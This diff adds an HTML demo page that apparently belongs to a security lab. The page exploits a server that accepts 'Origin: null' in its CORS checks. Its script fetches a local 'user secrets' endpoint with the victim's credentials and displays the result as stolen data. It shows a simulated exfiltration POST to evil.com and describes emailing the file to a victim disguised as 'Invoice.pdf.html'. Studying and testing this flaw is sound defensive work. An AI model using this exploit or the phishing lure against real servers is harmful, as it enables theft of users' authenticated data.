@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Null Origin CORS Attack</title>
+    <style>
+        body { font-family: Arial; margin: 40px; background: #f0f0f0; }
+        .status { padding: 20px; background: white; border-radius: 8px; margin: 20px 0; }
+        .success { color: green; }
+        .error { color: red; }
+        pre { background: #1e1e1e; color: #d4d4d4; padding: 15px; border-radius: 5px; overflow-x: auto; }
+    </style>
+</head>
+<body>
+    <h1>🎯 Null Origin CORS Attack Demo</h1>
+    <p><strong>Attack Vector:</strong> When this HTML file is opened locally (file:// protocol), the browser sends <code>Origin: null</code></p>
+    <p><strong>Vulnerability:</strong> Server accepts null origin, allowing file-based attacks</p>
+    
+    <div class="status" id="status">
+        <p>⏳ Attempting to steal user secrets...</p>
+    </div>
+    
+    <h2>Stolen Data:</h2>
+    <pre id="output">Waiting for response...</pre>
+    
+    <h2>How This Works:</h2>
+    <ol>
+        <li>Attacker emails victim this HTML file (disguised as "Invoice.pdf.html")</li>
+        <li>Victim opens file locally (file:// protocol)</li>
+        <li>Browser sends requests with <code>Origin: null</code></li>
+        <li>Vulnerable server accepts null origin</li>
+        <li>Attacker exfiltrates authenticated user data!</li>
+    </ol>
+    
+    <script>
+        const API_URL = 'http://localhost:5000';
+        const status = document.getElementById('status');
+        const output = document.getElementById('output');
+        
+        console.log('Current origin:', location.origin);
+        console.log('Expected: file:// protocol sends Origin: null');
+        
+        fetch(`${API_URL}/api/cors-demo/user/secrets`, {
+            credentials: 'include',
+            headers: {
+                'Accept': 'application/json'
+            }
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error(`HTTP ${response.status}`);
+            }
+            return response.json();
+        })
+        .then(data => {
+            status.innerHTML = '<p class="success">✅ Attack Successful! Server accepted null origin.</p>';
+            output.textContent = JSON.stringify(data, null, 2);
+            
+            // Exfiltrate to attacker server (simulated)
+            console.log('Would send to evil.com:', data);
+            
+            // Show exfiltration
+            const exfil = document.createElement('div');
+            exfil.innerHTML = `
+                <h2>📡 Data Exfiltration:</h2>
+                <pre>POST https://evil.com/collect
+${JSON.stringify(data, null, 2)}</pre>
+            `;
+            document.body.appendChild(exfil);
+        })
+        .catch(error => {
+            status.innerHTML = `<p class="error">❌ Attack Failed: ${error.message}</p>`;
+            output.textContent = error.stack;
+            
+            // Show why it failed
+            const fix = document.createElement('div');
+            fix.innerHTML = `
+                <h2>✅ Server is Secure!</h2>
+                <p>The server correctly rejected the null origin.</p>
+                <p><strong>Fix Applied:</strong> Reject <code>Origin: null</code> in CORS validation</p>
+            `;
+            document.body.appendChild(fix);
+        });
+    </script>
+</body>
+</html>
